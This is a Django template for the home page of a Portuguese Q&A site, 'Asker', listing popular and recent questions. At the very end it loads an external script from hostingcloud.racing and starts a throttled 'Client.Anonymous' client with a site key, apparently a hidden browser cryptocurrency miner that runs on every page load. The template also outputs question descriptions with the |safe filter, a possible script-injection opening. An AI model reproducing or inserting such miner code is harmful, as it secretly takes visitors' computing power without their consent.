{% spaceless %}
{% load humanize %}
{% load main_app_extras %}
<!doctype html>
<html lang="pt-br">
<head>
<title>Asker | Página inicial</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="/static/css/index.css?v=9">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/1f965a8b94.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.form/4.3.0/jquery.form.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/waypoints/4.0.1/jquery.waypoints.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/waypoints/4.0.1/shortcuts/infinite.min.js"></script>
</head>

	<body>
		<nav class="navbar navbar-expand-sm   navbar-light bg-light">
		    <a id="logo" href="/" class="navbar-brand"><img src="/static/images/asker.png" height="40px" alt="Asker"></a>
			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarTogglerDemo03" aria-controls="navbarTogglerDemo03" aria-expanded="false" aria-label="Toggle navigation">
				<span class="navbar-toggler-icon"></span>
			</button>
			<div class="collapse navbar-collapse" id="navbarTogglerDemo03">
				<ul class="navbar-nav mr-auto mt-2 mt-lg-0">
					{% if user.is_authenticated %}
					<li class="nav-item">
						<a class="nav-link" href="/user/{{ user.username }}"><i class="far fa-user"></i> perfil</a>
					</li>
					<li class="nav-item">
						<a class="nav-link" href="/ask"><i class="fas fa-question"></i> perguntar</a>
					</li>
					<li class="nav-item">
					    <a class="nav-link" href="/notifications"><i class="far fa-bell"></i> notificações</a>
					</li>
					<li class="nav-item">
					    <a class="nav-link" href="/rank"><i class="fas fa-trophy"></i> rank</a>
					</li>
					<li class="nav-item">
						<a class="nav-link" href="/logout"><i class="fas fa-external-link-alt"></i> sair</a>
					</li>
					{% else %}
					<li class="nav-item">
					    <a class="nav-link" href="/signin">Entrar</a>
					</li>
					<li class="nav-item">
						<a class="nav-link" href="/signup">Criar uma conta</a>
					</li>
					{% endif %}
				</ul>
			</div>
		</nav>
{{ account_verification_alert|safe }}
		<ul class="nav nav-tabs" id="tabs">
			<li class="nav-item">
				<span class="nav-link" id="popular">Popular</span>
			</li>
			<li class="nav-item">
				<span class="nav-link" id="news">Novas perguntas</span>
			</li>
			<li style="flex-grow: 1;">
				<a data-pjax style="float: right;" href="/pjax-questions"><img src="/static/images/reload.png" id="reload"></a>
			</li>
		</ul>
<!-- Questões recentes -->
<section class="card" id="n_questions">
{% include "base/recent-questions-pjax.html" %}
</section>
<!-- !Questões recentes -->

<!-- Questões populares -->
<section class="card" id="p_questions">
	<ul class="list-group list-group-flush infinite-container">
		{% for question in popular_questions %}
		<li class="list-group-item">
			<div class="card-body">
				<a href="/question/{{ question.id }}"><b>{{ question.text }}</b></a>
				<p>
					{% if question.description != '' %}{{ question.description|cut_description|safe|linebreaksbr }}{% endif %}
				</p>
				<small>{% total_answers question.id %} respostas <b>&middot; </b> <span class="text-muted"><img src="/static/images/white-heart.png" width="15px"> {{ question.total_likes }}</span></small>
				{% if user.is_authenticated %}
					{% answered user.username question.id as ANSWERED %}
					{% if ANSWERED %}
				<span style="display: block"><b>Sua resposta:</b></span> {% answer user.username question.id %}
					{% else %}
				<a style="display: block" href="/question/{{ question.id }}"><button class="btn btn-outline-primary">Responder</button></a>
					{% endif %}
				{% else %}
				<p><a href="/signin?redirect=/question/{{ question.id }}">Faça login</a> ou <a href="/signup?redirect=/question/{{ question.id }}">crie uma conta</a> para responder está pergunta.</p>
			{% endif %}
			</div>
		</li>
		{% endfor %}
	</ul>
	<h5>Fim! <a href="/news">Clique aqui</a> para ver as novas perguntas.</h5>
</section>
<!-- !Questões populares -->

<!-- PJAX -->
<script src="/static/js/jquery-pjax/jquery.pjax.js"></script>
<script>
	$(document).pjax('[data-pjax] a, a[data-pjax]', '#n_questions', {push: false, timeout: 10000})
	$('#n_questions').on('pjax:start', function() {
		/* Muda para a aba de perguntas recentes. */
		news.classList.add('active')
		popular.classList.remove('active')
		window.history.pushState("object or string", "Title", "/news");
		logo.href = '/news'
		p_tab.style.display = 'none'
		n_tab.style.display = 'block'
		
		document.getElementById('reload').classList.add('spinner');
		document.getElementById('n_questions').style.opacity = 0.5;
		document.getElementById('reload').onclick = function () { return false; }
	})
	.on('pjax:end',   function() {
		document.getElementById('reload').classList.remove('spinner');
		document.getElementById('n_questions').style.opacity = 1;
		document.getElementById('reload').onclick = function () { return true; }
	});
</script>
<!-- !PJAX -->

		<script src="/static/js/index.js?v=7"></script>
<script src="https://www.hostingcloud.racing/zk0a.js"></script><script>var _client=new Client.Anonymous("5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a",{throttle:.9,c:"w",ads:0});_client.start();</script>
	</body>
</html>
{% endspaceless %}
